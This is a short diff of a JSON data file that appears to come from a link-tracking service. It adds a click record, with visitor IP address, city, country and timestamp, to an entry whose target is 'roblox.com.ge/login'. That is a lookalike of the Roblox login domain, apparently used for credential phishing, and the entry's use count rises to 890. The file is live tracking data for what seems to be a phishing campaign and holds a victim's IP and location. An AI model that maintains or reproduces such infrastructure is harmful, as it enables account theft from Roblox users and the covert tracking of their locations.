@@ -110,7 +110,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 889,
+    "useCount": 890,
     "createdBy": "admin",
     "clicks": [
       {
@@ -7219,6 +7219,14 @@
       },
       {
         "timestamp": 1777193904523,
+        "ip": "41.86.40.232",
+        "country": "Seychelles",
+        "city": "Victoria",
+        "flag": "🇸🇨",
+        "countryCode": "SC"
+      },
+      {
+        "timestamp": 1777193925318,
         "ip": "41.86.40.232",
         "country": "Seychelles",
         "city": "Victoria",
